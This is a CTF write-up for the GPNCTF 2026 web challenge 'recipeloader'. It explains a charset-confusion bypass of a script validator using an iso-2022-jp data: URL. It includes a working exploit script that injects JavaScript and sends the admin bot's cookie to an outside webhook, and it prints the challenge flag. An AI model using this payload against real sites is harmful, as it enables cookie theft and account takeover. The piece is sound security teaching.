---
title: "GPNCTF2026-recipeloader"
description: "CTF writeup - recipeloader (GPNCTF 2026)"
date: 2026-05-30
tags: [CTF, Web, GPNCTF]
category: "GPNCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

![](./image.png)

### Check source code

The source contains:

```js
async function runScript(url) {
  const txt = await fetch(url).then(r => r.text());

  if (!isRecipeAssignmentProgram(txt)) {
    throw new Error("invalid recipe assignment program");
  }

  const s = document.createElement("script");
  s.src = url;

  if (!isScriptStatic(url)) {
    s.integrity = `sha256-${await sha256(txt)}`;
  }

  document.head.appendChild(s);
}
```

The check, done with `Acorn`, requires the source to be only a simple assignment:

```js
recipe = "..."
```

Or the right-hand side must be a string literal/template literal with no expressions.

### Vulnerability

The bug lies in the application using two different parsers/decoders for the same URL:

1. `fetch(url).then(r => r.text())` reads the content to validate it with Acorn.
2. `<script src=url>` lets the browser load and execute the script according to the resource's MIME/charset.

With a `data:` URL, the `isScriptStatic()` function treats it as a static protocol so it does not attach SRI integrity:

```js
function isScriptStatic(src) {
  let parsed = new URL(src, location.href);
  let proto = parsed.protocol.toLowerCase().replace(":", "");

  const staticProtos = ["data", "blob", "javascript", "mailto", "resource", "ssh", "tel"];

  if (staticProtos.includes(proto)) {
    return true;
  }
}
```

Therefore we can use `data:text/javascript;charset=iso-2022-jp,...` to create a difference between the content validated by `fetch().text()` and the content the browser executes when loading the script.

### Exploit idea

The admin bot sets the flag in a cookie then visits a URL we provide. Since the bot only accepts URLs starting with:

```text
http://localhost:1337
```

the final target will look like:

```text
http://localhost:1337/?url=<data-url-payload>
```

When the script runs in the `localhost:1337` origin, it can read `document.cookie` and send it to a webhook.

### Exploit script

```bash
CHALL='https://boiled-meatball-stuffed-with-braised-truffle-oil-0b6i.gpn24.ctf.kitctf.de'

TARGET=$(python3 - <<'PY'
from urllib.parse import quote, quote_from_bytes

WEBHOOK = "https://webhook.site/8eafb00c-ff64-4eaa-a987-16bbabf9b1f3"

src = (
    b'recipe="'
    + b'\x1b(J'
    + b'\\";location=\''
    + WEBHOOK.encode()
    + b'?c=\'+encodeURIComponent(document.cookie)//"'
)

data_url = "data:text/javascript;charset=iso-2022-jp," + quote_from_bytes(src)
target = "http://localhost:1337/?url=" + quote(data_url, safe="")
print(target)
PY
)

echo "$TARGET"

curl -s -G "$CHALL/bot/run" --data-urlencode "url=$TARGET"
```

### Result

After sending the URL to the bot, the webhook receives a request containing the cookie:

![](./image-1.png)

### Flag

```text
GPNCTF{uRl_PaR5INg_i5_h4rD_eV3N_FOr_8r0wS3rs}
```
